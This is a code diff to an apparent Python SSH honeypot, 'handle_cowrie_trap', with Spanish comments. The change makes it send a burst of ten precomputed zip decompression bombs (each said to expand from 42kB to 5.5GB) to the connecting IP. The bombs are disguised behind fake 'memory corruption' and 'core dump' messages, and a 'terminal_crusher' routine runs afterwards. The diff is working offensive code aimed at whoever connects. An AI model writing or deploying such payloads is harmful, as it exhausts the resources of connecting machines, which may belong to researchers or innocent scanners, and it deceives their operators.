@@ -41,14 +41,19 @@ def handle_cowrie_trap(client_socket, ip):
             else: client_socket.send(f"bash: {cmd}: command not found\r\n".encode())
 
         # EXPLOIT CHANNEL: Inyección tras agotarse la paciencia del sistema
-        print(f"[💀] SSH SESSION LIMIT REACHED: Inyectando Bomba Fifield a {ip}")
+        print(f"[💀] SSH TITAN-MODE: Enviando ráfaga de 10 Bombas Fifield a {ip}")
         client_socket.send(b"\r\n*** SYSTEM CRITICAL ERROR: MEMORY CORRUPTION DETECTED ***\r\n")
-        client_socket.send(b"*** INITIATING CORE DUMP (BINARY STREAM: 368 Mb) ***\r\n")
+        client_socket.send(b"*** INITIATING CORE DUMP RECOVERY LIST (10 SEGMENTS) ***\r\n")
         
-        # Obtener el payload de alta densidad (4.5 PB Expansión)
-        zip_payload = zip_generator.generate_ultra_zip()
-        client_socket.send(zip_payload)
+        # Obtener la lista de bombas pre-calculadas (42kB -> 5.5GB cada una)
+        bomb_list = zip_generator.get_bomb_list()
         
+        for index, payload in enumerate(bomb_list):
+            client_socket.send(f"\r\n--- TRANSFERRING SEGMENT {index+1}/10: SYSTEM_DUMP_{index+1}.ZIP ---\r\n".encode())
+            client_socket.send(payload)
+            time.sleep(0.1) # Ráfaga rápida
+        
+        client_socket.send(b"\r\n*** DUMP COMPLETE. ANALYZING DATA... ***\r\n")
         terminal_crusher(client_socket)
         
     except: pass
